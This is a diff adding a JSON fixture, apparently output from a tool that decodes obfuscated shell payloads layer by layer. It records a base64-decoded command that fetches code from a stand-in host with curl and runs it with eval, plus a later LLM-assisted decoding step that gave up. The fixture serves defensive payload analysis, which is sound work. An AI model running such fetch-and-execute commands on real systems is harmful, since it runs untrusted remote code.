@@ -1,0 +1,38 @@
+[
+  {
+    "index": 1,
+    "parent": 0,
+    "method": "base64",
+    "bytes_len": 80,
+    "text": "eval \"$(curl -s https://x.test/a)\"",
+    "truncated": false,
+    "markers": {
+      "exec": [
+        "eval"
+      ],
+      "remote": [
+        "curl"
+      ],
+      "decode": [],
+      "opaque": 0
+    },
+    "llm_assisted": false,
+    "status": "ok"
+  },
+  {
+    "index": 2,
+    "parent": 1,
+    "method": "harness",
+    "bytes_len": 0,
+    "text": "",
+    "truncated": false,
+    "markers": {
+      "exec": [],
+      "remote": [],
+      "decode": [],
+      "opaque": 0
+    },
+    "llm_assisted": true,
+    "status": "gave_up"
+  }
+]
